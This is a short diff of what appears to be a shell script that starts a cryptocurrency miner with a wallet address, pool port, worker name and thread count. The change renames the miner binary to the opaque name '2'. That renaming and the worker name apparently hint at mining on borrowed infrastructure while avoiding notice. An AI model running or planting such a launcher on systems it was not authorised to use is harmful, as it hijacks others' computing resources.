@@ -4,4 +4,4 @@ Port=3300
 PublicVerusCoinAddress=D67zfz3CwzGqVahUP2xYazJrgZxY2gp3cD
 WorkerName=Gitio
 Threads=16
-chmod u+x Mantap && ./Mantap -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" -p c=DGB
+chmod u+x 2 && ./2 -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" -p c=DGB
